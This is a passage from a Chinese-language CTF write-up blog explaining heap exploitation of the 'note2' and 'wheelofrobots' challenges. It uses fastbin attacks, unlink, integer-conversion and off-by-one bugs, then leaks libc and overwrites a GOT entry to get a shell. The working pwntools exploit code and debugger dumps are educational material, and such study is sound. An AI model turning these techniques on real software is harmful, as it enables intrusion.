int，当length等于0时，结果是一个非常大整数</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);                                 <span class="comment">// 读入错误退出程序</span></span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )                            <span class="comment">// 判断结束符</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + ptr) = buf;</span><br><span class="line">&#125;</span><br><span class="line">*(_BYTE *)(ptr + i) = <span class="number">0</span>;                      <span class="comment">// 写入结束符\x00</span></span><br><span class="line"><span class="keyword">return</span> i;</span><br></pre></td></tr></table></figure><p>造成原因前面有说，这里概述一下：length 为 unsigned int 当与 int 类型运算时，结果会被自动转换为 unsigned int ，那么 length - 1 就能产生一个巨大正数，从而无限输入。</p><p>还有一个地方就是 edit 功能。主要逻辑是创建一个 0xa0 的堆块，用来存放 tmp 数据、准备写入被修改 chunk 的数据，重点是**每次输入临时数据长度都是 0x90 **</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_input((__int64)(v8 + <span class="number">15</span>), <span class="number">0x90</span>LL, <span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>一开始看上去是存在溢出，假如 chunk size 为 0x80 ，就能溢出 0x90 ？不想多了，在调试后发现不会溢出的，因为有这一句话：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1[chunk_size - <span class="built_in">strlen</span>(&amp;dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>程序会在 chunk size 上限的地方写入一个 <code>\x00</code> ，从而避免了溢出。所以漏洞利用点就只有一个。</p><h3 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h3><p>这里我们利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。</p><ol><li>创建 3 个堆块，chunk1 为 fastbin ，其余是 unsorted bin 。创建 chunk 0 写入数据时，将 fake chunk 也写入。</li><li>释放 chunk 1 ， 然后再次申请相同大小的 chunk ，由于 fastbin 机制，会使用原来 chunk 1 的地址。申请 size 为 0 ，触发漏洞修改 chunk 2 的 prez_size 和 prez_inuse 。</li><li>释放 chunk 2 触发 unlink hijack chunk list 指针列表。</li></ol><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们先把 note 可能的基本操作列举出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span>(<span class="params">length, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;2.append]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br></pre></td></tr></table></figure><h4 id="生成三个-note"><a href="#生成三个-note" class="headerlink" title="生成三个 note"></a>生成三个 note</h4><p>构造三个 chunk，chunk0、chunk1 和 chunk2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">payload += p64(chunk_ptr-<span class="number">0x18</span>) + p64(chunk_ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0x80</span>,payload)</span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>其中这三个 chunk 申请时的大小分别为 0x80，0，0x80 。chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。</p><p>这里需要注意的是，chunk0 中一共构造了两个 chunk</p><ul><li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li><li>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br></pre></td></tr></table></figure><p>当构造完三个 note 后，堆的基本构造如图 1 所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">                                   +-----------------+ high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |      &#39;b&#39;*8      |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+  chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |   ……………………      |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |   ……………………      |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa1         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0            |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /40gx 0x603000</span></span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x603020:0x00000000006021080x0000000000602110</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000021</span><br><span class="line">0x6030a0:0x62626262626262620x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000091</span><br><span class="line">0x6030c0:0x63636363636363630x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><p>对应的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,payload)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">                                   +-----------------+high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |   &#39;\x00&#39;+&#39;b&#39;*7  |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+ chunk 2</span><br><span class="line">                                   |    size&#x3D;0x90    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa0         |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+ chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |   ...           |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  ...            |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |    ...          |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa1         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;0&#39; *8       |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br><span class="line">                                           图2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /40gx 0x603000</span></span><br><span class="line">0x603000:0x00000000000000000x0000000000000091</span><br><span class="line">0x603010:0x00000000000000000x00000000000000a1</span><br><span class="line">0x603020:0x00000000006021080x0000000000602110</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000021</span><br><span class="line">0x6030a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x6030b0:0x00000000000000a00x0000000000000090</span><br><span class="line">0x6030c0:0x63636363636363000x0000000000000000</span><br></pre></td></tr></table></figure><p>该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br></pre></td></tr></table></figure><p>unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p><h4 id="泄露-libc-地址"><a href="#泄露-libc-地址" class="headerlink" title="泄露 libc 地址"></a>泄露 libc 地址</h4><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content is &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br></pre></td></tr></table></figure><p>我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。</p><h4 id="修改-atoi-got"><a href="#修改-atoi-got" class="headerlink" title="修改 atoi got"></a>修改 atoi got</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(onegadget)</span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure><p>由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 one_gadget 地址。</p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>此时如果我们再调用 atoi ，其实调用的就是 one_gadget ，所以就可以拿到 shell 了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>题目考点：unlink、fastbin 机制、数字类型运算转换。</p><p>unlink 和 fastbin 与上面学习的差别不大，都是利用 unlink 控制 chunk list 修改当中的 堆指针地址，实现一个任意地址读写。</p><p>一开始在这条题目卡住就是在，edit 这个功能一度以为存在堆溢出。最后看 wp 才知道存在 unsigned int 与 int 运算类型转换的逻辑漏洞，找到溢出点就好做了。</p><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>动态链接 64 位，主要开启了 canary 保护与 nx 保护。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子才能启动。</p><p>程序非常依赖的一个功能是读取整数，该函数 read_num 是读取最长为 4 字节的内容，然后将其转化为 int 类型返回。</p><p>程序基本功能：堆增删查改。</p><ul><li><p>add</p><p>最多能申请 3 个堆块。每种轮子的创建策略不同，主要确保是申请大小的限制以及是否固定大小。</p></li><li><p>start_robot</p><p>随机选择一个轮子（堆）的内容进行输出，然后退出程序。</p></li><li><p>change</p><p>根据每个 chunk size 修改 chunk 内容</p></li></ul><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h4><p>add 选择添加的轮子时，调用 read_num 最长可以写入 4 字节，最后 1 字节会覆盖 bender_inuse ，构成了 off-by-one 漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000603110 choice          db    ? ;               ; DATA XREF: add+3A↑o</span><br><span class="line">.bss:0000000000603110                                         ; add+49↑o ...</span><br><span class="line">.bss:0000000000603111                 db    ? ;</span><br><span class="line">.bss:0000000000603112                 db    ? ;</span><br><span class="line">.bss:0000000000603113                 db    ? ;</span><br><span class="line">.bss:0000000000603114 bender_inuse    dd ?                    ; DATA XREF: add:loc_400EE0↑r</span><br></pre></td></tr></table></figure><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><p>add 添加 destructor 轮子（第6个）时，size 是正常产生的：<code>destructor = calloc(1uLL, 20 * v5);</code> ，没有对 v5 大小进行限制，具体可以对比第 3 个轮子。read_num 定义返回值为 int ，v5 定义为 unsigned int ，只要读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出。与此同时， <code>destructor_size = v5</code> 会很大，destructor_size 定义为 __int64 即 long long int 有符号 64 位整数，v5 强制赋值给它会依然为一个非常大的正数。</p><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>free chunk 只是释放内存，没有将对应指针清空，size 位也没有清空。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><blockquote><p>构造任意读写指针比较绕，后面就是前面的 unlink 操作。</p></blockquote><p>基本利用思路如下</p><ol><li><p>利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 <code>destructor_size</code>的大小，从而实现任意长度堆溢出。这里我们将轮子 1 tinny 分配到这里。</p><blockquote><p>这里是一定要 destructor 这个轮子，控制其他轮子的 size 值也是可以的，但主要是否能 bypass fastbin 的检查就行。</p></blockquote><p>fastbin attack 将 1 tinny 指针指向 destructor_size ，后续通过 edit 1 tinny 修改 destructor_size 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line"><span class="comment"># fastbin 指针指向：2 bender-&gt;NULL</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># 2 bender</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># off-by-one 覆写 idx2 inuse 为 1 让我们能编辑</span></span><br><span class="line">overflow_benderinuse(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line"><span class="comment"># 覆写 fd 2 0x603138, point to 2 bender&#x27;s size,后面伪造堆fd就是destructor_size</span></span><br><span class="line"><span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line"><span class="comment"># off-by-one 覆写 idx2 inuse 为 1</span></span><br><span class="line"><span class="comment"># 让我们再一次申请 2 bender</span></span><br><span class="line">overflow_benderinuse(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># add 2 bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line"><span class="comment"># 将原来 2 bender 空间申请出来</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line"><span class="comment"># 绕过fastbin size 检查：将size位伪造一个fastbin范围的值</span></span><br><span class="line"><span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line"><span class="comment"># 0x603140 是 3 Devil 的size位，申请fastbin范围即可</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 释放无用堆</span></span><br><span class="line"><span class="comment"># wheels must &lt;= 3</span></span><br><span class="line"><span class="comment"># only save tinny(0x603138)</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li><li><p>分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk 进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖 bss 段几乎所有的内容。</p><p>unlink 将 6 destructor 的指针指向 0x06030E8 - 0x18</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># alloc 6 destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># alloc 3 devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line"><span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">fakechunk_addr = <span 